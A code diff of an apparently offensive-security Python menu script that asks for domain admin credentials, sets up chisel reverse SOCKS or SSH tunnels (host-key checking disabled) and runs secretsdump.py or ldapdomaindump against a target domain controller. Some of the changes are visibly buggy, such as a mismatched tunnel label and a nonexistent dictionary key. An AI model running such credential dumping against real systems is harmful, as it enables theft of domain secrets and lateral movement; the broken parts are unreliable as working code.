@@ -3,11 +3,13 @@ import os
 import questionary
 from questionary import Style, select
 
-## Global Variables
-# Global variable to track if SOCKS Proxy was selected
+# Global dictionary for shared variables
+shared_variables = {}
+
+# Global flag to track if SOCKS Proxy was selected
 use_socks_proxy = False
 
-def tunneltype():
+def tunneltype(target, ssh_target_port):
     global use_socks_proxy
 
     proxy_question = input("Do you have to tunnel this connection through an intermediary? (Y/N): ").strip().lower()
@@ -28,7 +30,6 @@ def tunneltype():
                 socks_ip = input("Enter SOCKS Server IP: ")
                 socks_port = input("Enter SOCKS Server Port (default: 1080): ") or "1080"
                 command = f"chisel client {socks_ip}:{socks_port} R:socks &"
-                
                 try:
                     print("Connecting to Chisel server...")
                     subprocess.run(command, shell=True, check=True)
@@ -38,11 +39,11 @@ def tunneltype():
                 except subprocess.CalledProcessError as e:
                     print(f"\033[31m[-] Failed to connect to Chisel server. Error:\033[0m {e.stderr}")
                     return None
+
             case "SSH Tunnel":
                 ssh_tunnel_ip = input("Enter SSH Tunnel IP: ")
-                ssh_tunnel_port = input("Enter SSH Tunnel Port (default: 22): ").strip() or "22"
-                ssh_tunnel_user = input("Enter SSH Username for the Tunnel: ")
-                ssh_target_port = input("Please enter the destination port of your final target (Ex: SMB/445): " )
+                ssh_tunnel_port = input("Enter SSH Tunnel IP SSH Port (default: 22): ").strip() or "22"
+                ssh_tunnel_user = input("Enter SSH Username for the Tunnel Box: ")
 
                 tunnel_auth_method = select(
                     "Select SSH Authentication Method for the Tunnel:",
@@ -56,67 +57,74 @@ def tunneltype():
                 elif tunnel_auth_method == "SSH Key":
                     tunnel_key_file = select_ssh_key()
                     if not tunnel_key_file:
-                        print("No valid SSH key selected. Exiting.")
-                        return False
+                        print("\033[31m[-] No valid SSH key selected. Exiting.\033[0m")
+                        return None
                     ssh_command_prefix = f"ssh -i /root/.ssh/{tunnel_key_file} -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null"
 
-                # Construct the SSH command to set up the tunnel
+                # Construct the SSH command
                 command = (
-                    f"{ssh_command_prefix} -N -L 127.0.0.1:2222:{ssh_tunnel_ip}:{ssh_target_port}"
+                    f"{ssh_command_prefix} -N -f -L 127.0.0.1:2222:{target}:{ssh_target_port} "
                     f"{ssh_tunnel_user}@{ssh_tunnel_ip} -p {ssh_tunnel_port}"
                 )
 
                 try:
-                    # Run the command in the background
-                    process = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)
+                    print(f"Running SSH Tunnel Command: {command}")
+                    result = subprocess.run(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)
 
-                    print("\033[32m[+] Successfully set up SSH tunnel in the background.\033[0m")
-                    print("\033[32m[+] Process ID (PID):\033[0m", process.pid)
-
-                    return True  # Return True for successful SSH tunnel setup
+                    if result.returncode == 0:
+                        print("\033[32m[+] Successfully set up SSH tunnel.\033[0m")
+                        return "SSH Tunnel"
+                    else:
+                        print("\033[31m[-] SSH tunnel setup failed.\033[0m")
+                        print(f"Error: {result.stderr}")
+                        return None
                 except Exception as e:
-                    print(f"\033[31m[-] Failed to set up SSH tunnel. Error:\033[0m {e}")
-                    return False  # Return failure status
+                    print(f"\033[31m[-] Failed to set up SSH tunnel. Exception:\033[0m {str(e)}")
+                    return None
 
             case "TCP Tunnel":
-                print("TCP Tunnel module is still under development.")
-                return False
+                print("\033[31m[-] TCP Tunnel is not implemented.\033[0m")
+                return None
 
             case "Exit":
-                print("Exiting tunnel setup.")
-                return False
+                print("\033[31m[-] Exiting tunnel setup.\033[0m")
+                return None
 
-            case _:
-                print("Invalid choice. Exiting tunnel setup.")
-                return False
+    return None
 
-    else:
-        return True
 
 def creds():
+    global shared_variables
     print("\033[94mModule Selected: Domain Credentials Dump\033[0m")
-    domain = input("Enter Target Domain (Ex: steel.arizona.tu): ")
-    username = input("Enter High Privilege LDAP Username (Ex: Administrator): ")
-    password = input("Enter High Privileged LDAP User's Password: ")
-    target = input("Enter Target IP: ")
+    shared_variables["domain"] = input("Enter Target Domain (Ex: steel.arizona.tu): ")
+    shared_variables["username"] = input("Enter High Privilege LDAP Username (Ex: Administrator): ")
+    shared_variables["password"] = input("Enter High Privileged LDAP User's Password: ")
+    shared_variables["target"] = input("Enter Target IP: ")
+    shared_variables["ssh_target_port"] = input("Enter Target Box's Port: ")
 
-    tunnel_result = tunneltype()
-    
+    tunnel_result = tunneltype(shared_variables["target"], shared_variables["ssh_target_port"])
+
     if tunnel_result == "SOCKS Proxy":
-        print("\033[32m[+] Using SOCKS Proxy for LDAP dump.\033[0m")
         command = [
             "python",
             "/usr/local/bin/secretsdump.py",
-            f"{domain}/{username}:{password}@{target}",
+            f"{shared_variables['domain']}/{shared_variables['username']}:{shared_variables['password']}@{shared_variables['target']}",
             "-outputfile",
             "secretsdump_output.txt"
         ]
-    elif tunnel_result is "NO_TUNNEL":
-        # Direct command without tunneling
+    elif tunnel_result == "SSH Tunnel":
         command = [
             "python",
             "/usr/local/bin/secretsdump.py",
-            f"{domain}/{username}:{password}@{target}",
+            f"{shared_variables['domain']}/{shared_variables['username']}:{shared_variables['password']}@{shared_variables['target']}",
+            "-outputfile",
+            "secretsdump_output.txt"
+        ]
+    elif tunnel_result == "NO_TUNNEL":
+        command = [
+            "python",
+            "/usr/local/bin/secretsdump.py",
+            f"{shared_variables['domain']}/{shared_variables['username']}:{shared_variables['password']}@{shared_variables['target']}",
             "-outputfile",
             "secretsdump_output.txt"
         ]
@@ -124,47 +132,62 @@ def creds():
         print("\033[31m[-] Tunnel setup failed. Exiting credentials module.\033[0m")
         return
 
-    # Print and execute the command
     print("\033[33m[!] Command to be executed:\033[0m", " ".join(command))
     try:
-        result = subprocess.run(command, shell=False, stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True, check=True)
-        print("\033[32m[+] Secretsdump completed successfully. Output saved to secretsdump_output.txt.\033[0m")
-        print("\033[32m[+] Command Output:\033[0m")
+        result = subprocess.run(command, stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True, check=True)
+        print("\033[32m[+] Secretsdump completed successfully.\033[0m")
         print(result.stdout)
     except subprocess.CalledProcessError as e:
-        print(f"\033[31m[-] Secretsdump failed. Error:\033[0m")
+        print("\033[31m[-] Secretsdump failed. Error:\033[0m")
         print(e.stderr)
 
-def ldap():
-    # Placeholder for LDAP domain dump functionality
-    print("\033[94mModule Selected: Full LDAP Domain Dump\033[0m")
-    domain = input("Enter Target Domain (Ex: steel.arizona.tu): ")
-    username = input("Enter High Privilege LDAP Username (Ex: Administrator): ")
-    password = input("Enter High Privileged LDAP User's Password: ")
-    target = input("Enter Target IP: ")
 
-    tunnel_result = tunneltype()
+def ldap():
+    global shared_variables
+
+    print("\033[94mModule Selected: Full LDAP Domain Dump\033[0m")
+    shared_variables["domain"] = input("Enter Target Domain (Ex: steel.arizona.tu): ")
+    shared_variables["username"] = input("Enter High Privilege LDAP Username (Ex: Administrator): ")
+    shared_variables["password"] = input("Enter High Privileged LDAP User's Password: ")
+    shared_variables["target"] = input("Enter Target IP: ")
+    shared_variables["ssh_target_port"] = input("Enter Target Box's Port: ")
+
+    tunnel_result = tunneltype(shared_variables["target"], shared_variables["ssh_target_port"])
+
     if tunnel_result == "SOCKS Proxy":
-        print("\033[32m[+] Using SOCKS Proxy for LDAP dump.\033[0m")
+        print("\033[32m[+] SOCKS Proxy setup succeeded. Proceeding with LDAP dump...\033[0m")
         command = [
             "ldapdomaindump",
-            target,
+            shared_variables["target"],
             "-u",
-            f"{domain}\\{username}",
+            f"{shared_variables['domain']}\\{shared_variables['username']}",
             "-p",
-            password,
+            shared_variables["password"],
             "--no-json",
             "--no-grep"
         ]
-    elif tunnel_result == "NO_TUNNEL":
-        print("\033[32m[+] No tunneling required. Proceeding...\033[0m")
+    elif tunnel_result == "SSH_TUNNEL":
+        print("\033[32m[+] SSH Tunnel setup succeeded. Proceeding with LDAP dump...\033[0m")
         command = [
             "ldapdomaindump",
-            target,
+            shared_variables["127.0.0.1:2222"],
             "-u",
-            f"{domain}\\{username}",
+            f"{shared_variables['domain']}\\{shared_variables['username']}",
             "-p",
-            password,
+            shared_variables["password"],
+            "--no-json",
+            "--no-grep"
+
+        ]
+    elif tunnel_result == "NO_TUNNEL":
+        print("\033[32m[+] No tunneling required. Proceeding with LDAP dump...\033[0m")
+        command = [
+            "ldapdomaindump",
+            shared_variables["target"],
+            "-u",
+            f"{shared_variables['domain']}\\{shared_variables['username']}",
+            "-p",
+            shared_variables["password"],
             "--no-json",
             "--no-grep"
         ]
@@ -172,7 +195,6 @@ def ldap():
         print("\033[31m[-] Tunnel setup failed. Exiting LDAP module.\033[0m")
         return
 
-    # Print and execute the command
     print("\033[33m[!] Command to be executed:\033[0m", " ".join(command))
     try:
         print("\033[32m[+] Running LDAP domain dump...\033[0m")
@@ -191,6 +213,7 @@ def ldap():
 
 # Define custom style
 custom_style = Style([("choice", "fg:blue")])
+
 ascii_art = r"""
 +-----------------------------------------------------------------------------+
 |                                                                             |
